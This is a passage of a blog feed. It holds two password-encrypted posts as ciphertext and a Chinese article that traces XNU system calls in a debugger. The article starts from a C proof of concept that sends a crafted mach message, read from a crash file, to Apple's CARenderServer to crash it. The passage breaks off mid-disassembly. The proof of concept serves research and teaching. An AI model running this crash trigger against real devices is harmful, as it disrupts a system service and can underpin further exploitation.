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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq  